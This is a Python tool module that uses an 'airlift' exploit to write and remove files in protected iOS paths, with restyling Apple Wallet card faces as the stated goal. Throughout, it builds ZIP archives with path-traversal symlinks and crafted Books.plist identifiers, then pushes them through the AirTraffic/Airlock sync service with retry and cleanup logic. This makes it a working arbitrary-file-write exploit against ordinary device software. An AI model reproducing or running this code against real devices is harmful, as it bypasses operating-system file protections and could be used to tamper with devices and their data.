#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path

from .paths import TOOLS

DEVICE_HELPER = TOOLS / "device_helper"
AIRTRAFFIC_HOST = TOOLS / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))

                timeout = max(120, len(files) * 2)
                if progress_callback:
                    atc = run_json_streaming(atc_cmd, timeout=timeout, on_progress=progress_callback)
                else:
                    atc = run_json(atc_cmd, timeout=timeout)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


def _cache_removal_result(result: dict, leaves: list[str]) -> tuple[set[str], bool]:
    """Accept per-leaf evidence only after the native cleanup was confirmed."""
    operation = result.get("operation", {})
    if (result.get("targetGatePassed") is not True or not isinstance(operation, dict)
            or type(operation.get("cacheRemovalVersion")) is not int
            or operation["cacheRemovalVersion"] != 1
            or operation.get("safeArguments") is not True
            or operation.get("cleanupComplete") is not True
            or not isinstance(operation.get("booksRestore"), dict)
            or operation["booksRestore"].get("ok") is not True):
        return set(), False
    targets = operation.get("targets")
    if not isinstance(targets, list) or len(targets) != len(leaves):
        return set(), False
    verified = set()
    for leaf, row in zip(leaves, targets):
        if (not isinstance(row, dict) or row.get("leaf") != leaf
                or row.get("state") not in ("removed", "absent", "unverified")):
            return set(), False
        if row["state"] == "absent" and operation.get("directoryListingComplete") is not True:
            return set(), False
        if row["state"] != "unverified":
            verified.add(leaf)
    complete = len(verified) == len(leaves)
    if (operation.get("allTargetsInvalidated") is not complete
            or operation.get("ok") is not complete
            or result.get("exitCode") != (0 if complete else 2)):
        return set(), False
    return verified, True


def _remove_files_batch(udid: str, target: str, leaves: list[str]) -> tuple[set[str], bool]:
    """Attempt one batch; return verified leaves and whether cleanup is safe."""
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    protected_identifiers = [f"../../{link_destination}/{leaf}" for leaf in leaves]
    removed_destinations = [f"{source}/removed-{index}" for index in range(len(leaves))]

    with tempfile.TemporaryDirectory(prefix="airlift-remove-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        snapshot_root = work / "books-snapshot"
        snapshot_root.mkdir()
        archive_path.write_bytes(build_archive(target, b"apple-wallet-card-skinner-v2"))
        books_path.write_bytes(build_books([link_identifier, *protected_identifiers]))
        try:
            snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
        except Exception:
            return set(), True  # Snapshot reads have not modified device state.
        if not operation_ok(snapshot):
            return set(), True
        def finish_write():
            try:
                result = native("finish-write", udid, source, link_destination,
                                recovered, os.fspath(snapshot_root))
                return operation_ok(result) and result["operation"].get("cleanupComplete") is True
            except Exception:
                return False

        try:
            stage = native("stage", udid, source, link_destination, recovered,
                           os.fspath(archive_path), os.fspath(books_path), os.fspath(snapshot_root))
            if not isinstance(stage, dict) or not isinstance(stage.get("operation"), dict):
                raise ValueError("invalid cache staging response")
            staged = operation_ok(stage)
        except Exception:
            # The stage outcome is unknown; restore the snapshot and stop.
            finish_write()
            return set(), False
        if not staged:
            if stage["operation"].get("cleanupAuthorized") is False:
                return set(), True  # Native preflight rejected before changing anything.
            cleaned = finish_write()
            return set(), cleaned and stage["operation"].get("cleanupAuthorized") is True
        # Relocate the symlink, then move each protected cache leaf out.
        # AFCRemovePath cannot traverse this protected link on iOS 27.
        try:
            run_json([os.fspath(AIRTRAFFIC_HOST), udid,
                      link_identifier, link_destination,
                      *[part for pair in zip(protected_identifiers, removed_destinations)
                        for part in pair]], timeout=120)
        except Exception:
            pass  # The completion step verifies any partial work and cleans up.
        try:
            finish = native("finish-moved-removal", udid, source, link_destination,
                            recovered, os.fspath(snapshot_root), str(len(leaves)), *leaves)
            verified, cleaned = _cache_removal_result(finish, leaves)
            if not cleaned:
                finish_write()
            return verified, cleaned
        except Exception:
            finish_write()
            return set(), False


def remove_files(udid: str, target: str, leaves: list[str], retries: int = 3) -> bool:
    """Invalidate every requested rendered face, with a per-leaf fallback.

    A cache leaf succeeds only when the native helper observed its moved copy or
    verified its absence in a complete directory listing. Partial removal and
    permission errors must never be reported as an updated card face.
    """
    if not leaves:
        return True
    if any(not isinstance(leaf, str) or not leaf or "/" in leaf or "\0" in leaf or leaf in {".", ".."}
           for leaf in leaves):
        raise ValueError("cache leaves must be plain file names")
    remaining = list(dict.fromkeys(leaves))
    if len(remaining) > 32:
        raise ValueError("too many cache leaves")
    for attempt in range(max(1, retries)):
        verified, cleaned = _remove_files_batch(udid, target, remaining)
        if not cleaned:
            return False
        remaining = [leaf for leaf in remaining if leaf not in verified]
        if not remaining:
            return True
        if attempt + 1 < retries:
            time.sleep(0.4 * (attempt + 1))
    # Missing optional leaves can prevent a combined AirTraffic transfer. Retry
    # only unresolved leaves, and require every one to be removed or proven absent.
    if len(set(leaves)) > 1:
        for leaf in list(remaining):
            verified, cleaned = _remove_files_batch(udid, target, [leaf])
            if not cleaned:
                return False
            if leaf in verified:
                remaining.remove(leaf)
    return not remaining
